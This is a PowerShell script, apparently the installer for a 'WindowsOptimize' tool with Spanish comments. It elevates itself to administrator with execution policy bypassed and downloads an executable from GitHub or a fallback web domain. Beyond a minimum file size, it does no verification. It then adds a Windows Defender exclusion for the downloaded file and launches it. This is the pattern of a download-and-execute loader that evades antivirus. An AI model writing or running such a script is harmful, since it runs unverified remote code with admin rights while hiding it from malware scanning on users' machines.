# ================= TLS 1.2 =================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ================= ADMIN CHECK =================
function Test-Admin {
    $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    Start-Process powershell `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" `
        -Verb RunAs
    exit
}

# ================= VARIABLES =================
$owner = "mggons93"
$repo  = "OptimizeUpdate"
$fallbackBaseUrl = "https://syasoporteglobal.online/WindowsOptimize"

# ================= DETECTAR ARQUITECTURA =================
if ([Environment]::Is64BitOperatingSystem) {
    $arch = "X64"
} else {
    $arch = "x86"
}

$fileName = "WindowsOptimizeApp_$arch.exe"
$finalName = "WindowsOptimize.exe"

Write-Output "Sistema detectado: $arch"

# ================= RUTAS =================
$tempPath  = Join-Path -Path $env:USERPROFILE -ChildPath $fileName
$finalPath = Join-Path -Path $env:USERPROFILE -ChildPath $finalName

# ================= FUNCIÓN DESCARGA =================
function Download-File($url, $output) {
    try {
        Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

# ================= INTENTO 1: GITHUB =================
Write-Output "Intentando descarga desde GitHub..."

$downloaded = $false

try {
    $release = Invoke-RestMethod "https://api.github.com/repos/$owner/$repo/releases/latest" -ErrorAction Stop

    $asset = $release.assets | Where-Object { 
        $_.name -eq $fileName
    }

    if ($asset) {
        $downloaded = Download-File $asset.browser_download_url $tempPath
    } else {
        Write-Warning "No se encontró el asset en GitHub"
    }

} catch {
    Write-Warning "Error accediendo a GitHub"
}

# ================= FALLBACK =================
if (-not $downloaded) {
    Write-Warning "Usando fallback desde servidor web..."

    $fallbackUrl = "$fallbackBaseUrl/$fileName"

    $downloaded = Download-File $fallbackUrl $tempPath

    if (-not $downloaded) {
        Write-Error "Error descargando desde GitHub y fallback web"
        exit 1
    }
}

# ================= VALIDACIÓN =================
if (-not (Test-Path $tempPath)) {
    Write-Error "El archivo no existe después de la descarga"
    exit 1
}

$fileSize = (Get-Item $tempPath).Length
if ($fileSize -lt 500000) {
    Write-Error "Archivo descargado sospechosamente pequeño"
    exit 1
}

# ================= RENOMBRAR =================
Write-Output "Renombrando a $finalName..."

try {
    if (Test-Path $finalPath) {
        Remove-Item $finalPath -Force
    }

    Rename-Item -Path $tempPath -NewName $finalName
} catch {
    Write-Error "Error renombrando el archivo"
    exit 1
}

Write-Output "Archivo final: $finalPath"

# ================= EXCEPCIÓN DEFENDER =================
try {
    Add-MpPreference -ExclusionPath $finalPath
    Write-Output "Excepción de Windows Defender añadida"
} catch {
    Write-Warning "No se pudo agregar la exclusión"
}

# ================= EJECUTAR =================
Write-Output "Ejecutando $finalName..."

try {
    Start-Process -FilePath $finalPath
} catch {
    Write-Error "Error al ejecutar el archivo"
    exit 1
}
